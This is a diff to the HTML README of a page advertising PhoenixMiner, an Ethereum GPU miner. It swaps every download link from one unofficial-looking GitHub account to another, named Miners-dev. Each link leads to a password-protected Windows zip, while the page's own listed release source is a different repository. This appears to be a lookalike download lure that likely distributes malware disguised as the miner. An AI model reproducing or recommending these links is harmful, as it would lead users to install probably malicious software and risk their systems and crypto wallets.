@@ -1,6 +1,6 @@
 <p align="center">
-<a href="https://github.com/PhoenixMiner-download/PhoenixMiner/releases/download/5.1b/PhoenixMiner_5.1b_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
-<img src="https://github.com/PhoenixMiner-download/PhoenixMiner/blob/master/files/git-files/phoenix-header-6.jpg?raw=true" /></a>
+<a href="https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
+<img src="https://github.com/Miners-dev/PhoenixMiner/blob/master/files/git-files/phoenix-header-6.jpg?raw=true" /></a>
 </p>
 
 <p align="center">
@@ -21,8 +21,8 @@
 <p>PhoenixMiner is high performance Ethereum (ETH) and ERC20 tokens  miner, with the official full Windows / Linux support.
 </p>
 <p align="center">
-<a href="https://github.com/PhoenixMiner-download/PhoenixMiner/releases/download/5.1b/PhoenixMiner_5.1b_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
-<img src="https://github.com/PhoenixMiner-download/PhoenixMiner/blob/master/files/git-files/monitor.jpg?raw=true" /></a>
+<a href="https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
+<img src="https://github.com/Miners-dev/PhoenixMiner/blob/master/files/git-files/monitor.jpg?raw=true" /></a>
 </p>
 
 <p>PhoenixMiner is one of the most efficient and convenient miners to date, which is why it won the general recognition of miners.
@@ -57,13 +57,13 @@
 * API for rig monitoring
 
 
-<img src="https://github.com/PhoenixMiner-download/PhoenixMiner/blob/master/files/git-files/mining.jpg?raw=true" width="866" >
+<img src="https://github.com/Miners-dev/PhoenixMiner/blob/master/files/git-files/mining.jpg?raw=true" width="866" >
 
 ## Download
 
 <p>
-<a href="https://github.com/PhoenixMiner-download/PhoenixMiner/releases/download/5.1b/PhoenixMiner_5.1b_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
-<img src="https://github.com/PhoenixMiner-download/PhoenixMiner/blob/master/files/git-files/downlaod.png?raw=true" width="300" ></a></p>
+<a href="https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
+<img src="https://github.com/Miners-dev/PhoenixMiner/blob/master/files/git-files/downlaod.png?raw=true" width="300" ></a></p>
 
 * Binary releases: https://github.com/PhoenixMiner/PhoenixMiner/releases
 * Git tree: https://github.com/PhoenixMiner/PhoenixMiner.git
@@ -72,7 +72,7 @@
 ## How to use
 
 <li>Step 1 -  Install your GPUs and set up your computer</li>
-<li>Step 2 -  <a href="https://github.com/PhoenixMiner-download/PhoenixMiner/releases/download/5.1b/PhoenixMiner_5.1b_Windows.Password-phoenix.zip">Download latest PhoenixMiner</a></li>
+<li>Step 2 -  <a href="https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Windows.Password-phoenix.zip">Download latest PhoenixMiner</a></li>
 <li>Step 3 -  Get an Ethereum wallet (<a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/ethereum/mist/releases">Mist</a> or MyEtherWallet)</li>
 <li>Step 4 -  Join a mining pool
 <li>Step 5 -  Start mining!</li>
